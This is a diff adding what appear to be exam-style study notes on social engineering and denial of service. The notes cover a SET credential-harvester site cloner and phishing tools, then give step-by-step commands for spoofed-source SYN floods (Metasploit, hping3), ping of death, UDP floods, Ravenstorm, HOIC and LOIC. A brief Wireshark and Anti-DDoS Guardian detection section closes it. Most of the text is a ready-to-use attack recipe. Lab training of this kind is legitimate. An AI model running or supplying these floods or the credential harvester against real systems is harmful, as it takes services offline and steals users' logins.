@@ -1,0 +1,92 @@
+Social Engineering 
+
+1. Social Engineering Toolkit - Perform Campaign
+
+setoolkit --> Social Engineering Attack --> Website Attack Vectors --> Credential Harvester --> Site Cloner
+
+2.Netcraft Entension - Detect Phishing
+
+3. Phish Tank - Detect Phishing
+
+4.Oh Phish - Perform Phishing Campaign
+
+
+Denial Of Service
+
+1.Perform 
+
+i. Metasploit - SYN Flood Attack
+
+nmap -p 21 <<Target IP>> #check open ports or specific port
+
+msfconsole -q #start msfconsole
+use auxiliary/dos/tcp/synflood #SYN Flooding module
+set RHOST <<Target IP>>
+set RPORT 21
+set SHOST <Spoofed IP Address> #Our fake IP 
+set TIMEOUT 20000 and press Enter
+
+#open Wireshark
+tcp.port=21
+
+
+ii. HPing3 - SYN Flood , POD, UDP
+#Perform SYN Flooding
+hping3 -S <<Target IP>> -a <<Spoofable IP>> -p <<Port to flood>> --flood
+-S: Set the SYN flag
+-a: Spoof the IP address
+-p: Specify the destination port, e.g 22
+
+#Perform Ping Of Death
+hping3 -d 65538 -S -p 21 -–flood <<Target IP>>
+-d: Specify data size
+-S: Set the SYN flag
+
+#Perform UDP application layer flood attack
+nmap -p 139 <<Target IP>>
+hping3 -2 -p 139 -–flood <<Target IP>>
+-2: Specify UDP mode
+
+iii.Ravenstorm
+
+sudo rst  
+--> l4 
+--> ip <<Target IP>>
+--> port <<port number>>
+--> threads 20000 --> run
+
+iv. HOIC
+
+Open HOIC.
+Set threads = 20
+Click + to add target
+Enter Target http://<Target IP> -> Power = High -> Booster = GenericBoost.hoic
+FIRE TEH LAZER! to launch attack 
+
+v. LOIC 
+Target IP --> Lock On --> Port, Method, Threads, Speed -->IMMA CHARGIN MAH LAZER.
+
+
+2. Detection
+
+i. Anti DDOS Guardian.
+
+#USE LOIC For DDOS
+
+In Anti-DDOS Guardian, Huge Number of packets comes in Incoming Tab.
+
+Double click on that IP and Block IP.
+
+
+ii. Wireshark 
+
+statistic -> IPv4 statistics -> source and destination address
+
+filter using: tcp.flags.syn == 1 or 
+
+tcp.flags.syn == 1 and tcp.flags.ack == 0 or filter to highest number of request
+tcp.flags.syn == 1 and tcp.flags.ack == 1
+
+Statistic -> conversion
+identified ip , which has flooding server with SYN request.
+
